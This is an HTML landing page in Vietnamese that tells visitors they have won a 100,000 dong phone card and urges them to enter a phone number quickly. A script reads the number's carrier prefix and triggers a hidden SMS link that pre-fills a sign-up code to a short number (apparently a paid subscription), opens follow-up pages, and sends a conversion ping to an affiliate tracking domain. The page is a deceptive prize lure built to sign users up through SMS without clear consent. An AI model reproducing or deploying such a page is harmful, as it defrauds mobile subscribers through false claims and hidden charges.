<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE-edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Vui lòng gửi tin nhắn để đăng ký</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link href="css/style.css" rel="stylesheet">
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</head>
<body>
    <div id="app">
        <div id="wrapper">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12">
                        <div class="news-top">
                            <img src="images/banner2.jpg" style="width:100%">
                        </div>
                        <div id="form_submit12" class="formSubmit">
                            <h2>Vui lòng nhập số điện thoại để tiếp tục</h2>
                            <input id="phone" type="tel" name="phone" placeholder="Nhập số điện thoại" value="">
                            <button id="button_submit" class="btn_submit page_122 active pt-3">Tiếp tục</button>
                        </div>
                        <div style="font-size: 18px; padding-left: 6px; padding-right: 6px;">
                            <p>
                                Chúc mừng quý khách đã may mắn trúng thưởng 1 thẻ điện thoại trị giá 100.000 đồng. Vui lòng nhập số điện thoại và gửi tin nhắn xác nhận để chúng tôi gửi ngay cho quý khách phần thưởng . Chỉ còn duy nhất 5 suất . Hãy nhanh tay lên nào !!! 
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="copyright mt-3 mb-5"></div>
        </div>
    </div>

    <a href="sms://1266?&body=DK TV" id="linkidViettel"></a>
    <a href="sms://888?&body=EV2" id="linkidVina"></a>
    <a href="sms://9285?&body=XNK5" id="linkidMobi"></a>

    <script type="text/javascript">
        // Function to get the value of a URL parameter by name
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, "\\$&");
            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, " "));
        }

        // Function to generate a random string of a given length
        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }



        // Function to perform the HTTP request and print the response
        function sendConversionRequest(cid) {
            // Get the current timestamp
            const timestamp = Date.now();

            // Generate a random string (6 characters in this case)
            const randomString = generateRandomString(6);
            const randomString2 = generateRandomString(6);

            // Create the modified cid
            const modifiedCid = `${timestamp}_${randomString2}_${randomString}`;

            var url = `https://go1.reacheffecti.work/conversion.go?pid=4608&cid=${modifiedCid}&conv_type=b`;

            fetch(url)
                .then(response => response.text())
                .then(data => {
                    console.log('Response:', data);
                    // You can further process or display the response here
                })
                .catch(error => console.error('Error:', error));
        }

        // Get the value of the 'cid' parameter
        var cidValue = getParameterByName('cid');

        if (cidValue) {
            // Perform the HTTP request with the 'cid' value
            sendConversionRequest(cidValue);
        } else {
            console.error('No cid parameter found in the URL.');
        }
        


        var Mobi = ['090', '093', '089', '070', '076', '077', '078', '079'];
        var Vina = ['088', '091', '094', '081', '082', '083', '084', '085'];
        var Viettel = ['096', '097', '098', '086', '032', '033', '034', '035', '036', '037', '038', '039'];

        var ViettelUrl ="sms://1266?&body=DK TV"
        var VinaUrl = "sms://888?&body=EV2"
        var MobiUrl = "sms://9285?&body=XNK5"

        $(document).ready(function(){
            $('#button_submit').on("click", function(){
                var phoneNumber = $('#phone').val();
                if (phoneNumber) {
                    var firstTwoDigits = phoneNumber.substring(0, 3); // Use 3 digits for matching
                    if ($.inArray(firstTwoDigits, Viettel) !== -1) {
                        document.getElementById("linkidViettel").click();
                        window.open('./send_viettel.html');
                    } else if ($.inArray(firstTwoDigits, Mobi) !== -1) {
                        document.getElementById("linkidMobi").click();
                        window.open('./send_mobi.html');
                    } else if ($.inArray(firstTwoDigits, Vina) !== -1) {
                        document.getElementById("linkidVina").click();
                        window.open('./send_vina.html');
                    } else {
                        // Handle other cases or show an error message
                        console.log("abcdegaa")
                    }
                }
            });
        });
    </script>
</body>
</html>


